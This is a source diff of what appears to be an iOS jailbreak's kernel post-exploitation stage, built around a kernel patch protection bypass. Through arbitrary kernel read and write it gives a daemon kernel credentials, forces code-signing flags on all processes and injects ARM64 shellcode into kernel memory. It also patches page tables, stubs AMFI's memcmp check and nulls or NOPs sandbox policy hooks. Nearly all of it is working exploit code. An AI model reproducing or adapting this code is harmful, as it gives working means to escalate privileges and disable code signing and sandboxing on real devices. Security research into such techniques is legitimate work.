@@ -17,13 +17,10 @@
 #include "patchfinder64.h"
 
 
-#define offset_p_pid        0x10
-#define offset_proc_ucred   0x100
-#define offset_p_comm       0x26c
-#define offset_p_csflags    0x2a8
+#define INSN_NOP  0xd503201f
 
 
-task_t tfp0; // export for pte_stuff.h
+extern task_t tfp0; // for pte_stuff.h
 
 
 kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_t self_cred, uint64_t self_proc) {
@@ -45,15 +42,26 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     
 #pragma mark - csflags
     
-    uint64_t allprocs = find_allproc();
-    LOG("[INFO]: allproc = 0x%llx", allprocs);
-    uint64_t proc = self_proc;
+    uint64_t allproc = find_allproc();
+    LOG("[INFO]: allproc = 0x%llx", allproc);
+    
+    uint64_t proc = ReadAnywhere64(allproc);
     while(proc) {
         uint32_t pid = ReadAnywhere32(proc + offset_p_pid);
+        
         char pname[40] = {0};
-        kread(proc + offset_p_comm, pname, sizeof(pname));        
+        kread(proc + offset_p_comm, pname, 20);
+        
+        if (strstr(pname, "containermanager")) {
+            printf("[INFO]: found containermanagerd, giving it kern creds \n");
+            WriteAnywhere64(proc + offset_p_cred, kern_cred);
+        }
+        
         uint32_t csflags = ReadAnywhere32(proc + offset_p_csflags);
-        WriteAnywhere32(proc + offset_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
+        csflags |= CS_VALID|CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+        csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+        WriteAnywhere32(proc + offset_p_csflags, csflags);
+        
         printf("[INFO]: entitled proc: (%d) %s \n", pid, pname);
         
         proc = ReadAnywhere64(proc);
@@ -69,7 +77,6 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
 
     gPhysBase = ReadAnywhere64(gStoreBase);
     printf("[INFO]: gPhysBase = %llx \n", gPhysBase);
-    
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     printf("[INFO]: gVirtBase = %llx \n", gVirtBase);
     
@@ -87,15 +94,14 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     printf("[INFO]: cpu_list = %llx \n", cpu_list);
-    
     uint64_t cpu = ReadAnywhere64(cpu_list);
     printf("[INFO]: cpu = %llx \n", cpu);
     
     uint64_t pmap_store = find_kernel_pmap();
     printf("[INFO]: pmap = %llx \n", pmap_store);
-    
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
     printf("[INFO]: level1_table = %llx \n", level1_table);
+    
     
     uint64_t shellcode = physalloc(0x4000);
 
@@ -143,10 +149,9 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
         
         if (!idlesleep_handler) {
             WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
-            printf("[INFO]: idlehandler at: %llx \n", ReadAnywhere64(cpu+0x130));
-
+            printf("[INFO]: idlehandler: %llx \n", ReadAnywhere64(cpu+0x130));
             WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
-            printf("[INFO]: deephandler at: %llx \n", ReadAnywhere64(cpu+0x130) + 12);
+            printf("[INFO]: deephandler: %llx \n", ReadAnywhere64(cpu+0x130) + 12);
             
             idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
             printf("[INFO]: idlesleep_handler = %llx \n", idlesleep_handler);
@@ -184,7 +189,7 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     printf("[INFO]: regi=%llx - regd=%llx\n", regi, regd);
     
     for (int i = 0; i < 0x500/4; i++) {
-        WriteAnywhere32(shc+i*4, 0xd503201f); // nop
+        WriteAnywhere32(shc+i*4, INSN_NOP);
     }
 
     /*
@@ -233,32 +238,30 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     {
         int n = 0;
         
-        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
-        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
-        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
-        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
-        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
-        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
-        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
-        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
-        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
-        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
+        //WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
+        //WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
+        //WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
+        //WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
+        //WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
+        //WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
+        //WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
+        //WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
+        //WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
+        //WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
+        //WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
         
         // test (10.3.2)
-//        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr      w8, 0x28
-//        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str      w8, [x23]
-//        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov      x0, xzr
-//
-//        WriteAnywhere32(shc+0x200+n, 0xA9477BFD); n+=4; // ldp      x29, x30, [sp, #112]
-//        WriteAnywhere32(shc+0x200+n, 0xA9464FF4); n+=4; // ldp      x20, x19, [sp, #96]
-//        WriteAnywhere32(shc+0x200+n, 0xA94557F6); n+=4; // ldp      x22, x21, [sp, #80]
-//        WriteAnywhere32(shc+0x200+n, 0xA9445FF8); n+=4; // ldp      x24, x23, [sp, #64]
-//        WriteAnywhere32(shc+0x200+n, 0xA94367FA); n+=4; // ldp      x26, x25, [sp, #48]
-//        WriteAnywhere32(shc+0x200+n, 0x910203FF); n+=4; // add      sp, sp, #128
-//
-//        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-//        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b   v15, { v0, v1, v2 }, v0
+        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr      w8, 0x28
+        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str      w8, [x23]
+        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov      x0, xzr
+        WriteAnywhere32(shc+0x200+n, 0xA9477BFD); n+=4; // ldp      x29, x30, [sp, #112]
+        WriteAnywhere32(shc+0x200+n, 0xA9464FF4); n+=4; // ldp      x20, x19, [sp, #96]
+        WriteAnywhere32(shc+0x200+n, 0xA94557F6); n+=4; // ldp      x22, x21, [sp, #80]
+        WriteAnywhere32(shc+0x200+n, 0xA9445FF8); n+=4; // ldp      x24, x23, [sp, #64]
+        WriteAnywhere32(shc+0x200+n, 0xA94367FA); n+=4; // ldp      x26, x25, [sp, #48]
+        WriteAnywhere32(shc+0x200+n, 0x910203FF); n+=4; // add      sp, sp, #128
+        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
+        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b   v15, { v0, v1, v2 }, v0
     }
     
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
@@ -276,7 +279,7 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
         WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr    CPACR_EL1, x0
         WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr    TTBR1_EL1, x1
         WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr    x0, #-4
-        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
+        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : INSN_NOP); n+=4; // dsb ish (4k) / nop (16k)
         WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi vae1, x30 (16k)
         WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
         WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
@@ -363,7 +366,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     uint64_t shtramp = kbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
     printf("[INFO]: shtramp = %llx \n", shtramp);
-    
     RemapPage(cpacr_addr);
     WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
     
@@ -375,16 +377,17 @@ remappage[remapcnt++] = (x & (~PMK));\
     printf("[INFO]: wrote branch to kppsh -> 0x%llx \n", kppsh);
     
     
+#pragma mark - LwVM
+    
     uint64_t lwvm_write = find_lwvm_mapio_patch();
     printf("[INFO]: lwvm_write = %llx \n", lwvm_write);
-    
     uint64_t lwvm_value = find_lwvm_mapio_newj();
     printf("[INFO]: lwvm_value = %llx \n", lwvm_value);
     RemapPage(lwvm_write);
     WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
     
     
-#pragma mark - kernvers
+#pragma mark - MarijuanARM
     
     uint64_t kernvers = find_str("Darwin Kernel Version");
     uint64_t release = find_str("RELEASE_ARM");
@@ -397,7 +400,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     
-#pragma mark - nonce enabler
+#pragma mark - patch: nonce enabler
     
     uint64_t sysbootnonce = find_sysbootnonce();
     printf("[INFO]: found com.apple.System.boot-nonce at: 0%llx\n", sysbootnonce);
@@ -406,25 +409,23 @@ remappage[remapcnt++] = (x & (~PMK));\
     printf("new val = %d", ReadAnywhere32(sysbootnonce));
     
     
-#pragma mark - AMFI (memcmp_got)
+#pragma mark - patch: AMFI memcmp
     
     uint64_t memcmp_got = find_amfi_memcmpstub();
-    printf("[INFO]: amfi_memcmpstub at %llx\n", memcmp_got);
+    printf("[INFO]: memcmp_got at %llx\n", memcmp_got);
     
     uint64_t ret1 = find_ret_0();
-    printf("[INFO]: ret = %llx\n", ret1);
+    printf("[INFO]: ret1 at %llx\n", ret1);
 	
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
 	
-	
-#pragma mark - AMFI (amfiops)
     
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
     printf("[INFO]: fref at %llx\n", fref);
 
     uint64_t amfiops = find_amfiops();
-    printf("[INFO]: amfiops at %llx\n", amfiops);
+    printf("[INFO]: amfiops = %llx\n", amfiops);
     
     {
         /*
@@ -476,7 +477,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     
-#pragma mark - sandbox policies
+#pragma mark - patch: sandbox policies
     
     {
         uint64_t sbops = find_sbops();
@@ -488,155 +489,6 @@ remappage[remapcnt++] = (x & (~PMK));\
             RemapPage(((sbops + i*(PSZ)) & (~PMK)));
         }
         
-        
-#pragma mark - all policies mentioned in sandbox kext (10.3.2)
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_clone)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_searchfs)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setacl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_uipc_bind)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_uipc_connect)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_write)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_rename)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_fcntl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_ioctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_set)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_filter_properties)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_hid_control)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_nvram_delete)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_nvram_get)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_nvram_set)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_set_properties)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_kext_check_load)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_kext_check_query)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_kext_check_unload)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_mount)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_snapshot_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_snapshot_delete)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_umount)), 0);
-
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_policy_init)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_policy_initbsd)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_policy_syscall)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixsem_check_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixsem_check_open)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixsem_check_post)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixsem_check_unlink)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixsem_check_wait)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixshm_check_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixshm_check_open)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixshm_check_stat)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixshm_check_truncate)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_posixshm_check_unlink)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_priv_check)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_priv_grant)), 0);
-
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_debug)), 0); /* bb/sb won't restart! */
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_expose_task)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_cs_info)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_task)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_task_name)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_proc_info)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_sched)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_setaudit)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_setauid)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_cs_info)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_host_exception_port)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_host_special_port)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_signal)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_suspend_resume)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_pty_notify_close)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_pty_notify_grant)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_bind)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_connect)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_create)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_listen)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_receive)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_send)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_acct)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_audit)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_auditctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_auditon)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_chud)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_host_priv)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_info)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_kas_info)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_nfsd)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_reboot)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_settime)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_swapoff)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_swapon)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_system_check_sysctlbyname)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_enqueue)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msgrcv)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msgrmid)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msqctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msqget)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msqrcv)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvmsq_check_msqsnd)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvsem_check_semctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvsem_check_semget)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvsem_check_semop)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvshm_check_shmat)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvshm_check_shmctl)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvshm_check_shmdt)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_sysvshm_check_shmget)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_cred_check_label_update)), 0);
-        
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_cred_label_associate)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_cred_label_destroy)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_cred_label_update)), 0);
-//        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_cred_label_update_execve)), 0);
-        
-        
-#pragma mark - sandbox patches
-
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
@@ -670,29 +522,38 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
         
-        // from h3lix
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
-        
-        
-#pragma mark - mpo_cred_check_label_update_execve
-        
-        // mpo_cred_check_label_update_execve
-        // has to patched like this or Widgets (and javascript?) fail (thx tihmstar)
-        {
-#define INSN_NOP  0xd503201f
-
-            uint64_t off = find_sandbox_label_update_execve();
-            LOG("find_sandbox_label_update_execve() -> 0x%llx", off);
-            RemapPage(off);
-            WriteAnywhere32(NewPointer(off), INSN_NOP);
-            LOG("patched execve");
-        }
-        
+        // test: from h3lix
+        //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
+        //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
     }
     
     
-#pragma mark - amfiret
+#pragma mark - patch: Sandbox: process-exec denied while updating label
+    
+    // thx tihmstar
+    {
+        uint64_t off = find_sandbox_label_update();
+        LOG("found sandbox_label_update patch location -> 0x%llx", off);
+        RemapPage(off);
+        WriteAnywhere32(NewPointer(off), INSN_NOP);
+    }
+    
+    
+#pragma mark - patch: tests
+    
+    {
+        //cs_enforcement_disable_amfi
+    }
+    
+//    {
+//        //AMFI: hook..execve()
+//        uint64_t off = 0xfffffff0064502a0 + slide;
+//        RemapPage(off);
+//        WriteAnywhere32(NewPointer(off), INSN_NOP);
+//    }
+    
+    
+#pragma mark - patch: AMFI: hook..execve()
     
     {
         uint64_t point = find_amfiret() - 0x18;
@@ -709,6 +570,8 @@ remappage[remapcnt++] = (x & (~PMK));\
         printf("[INFO]: wrote branch to shc+0x200");
     }
     
+    
+#pragma mark -
     
